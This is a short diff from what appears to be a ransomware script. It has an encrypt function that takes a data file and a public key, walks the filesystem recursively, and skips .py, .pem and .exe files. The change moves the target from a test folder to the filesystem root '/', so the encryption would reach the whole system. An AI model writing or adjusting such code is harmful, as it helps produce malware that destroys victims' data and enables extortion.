@@ -59,7 +59,7 @@ def encrypt(dataFile, publicKey):
 
 
 
-directory = '/home/revan/rw/df' # CHANGE THIS
+directory = '/' # CHANGE THIS
 excludeExtension = ['.py','.pem', '.exe'] # CHANGE THIS
 for item in scanRecurse(directory): 
     filePath = Path(item)
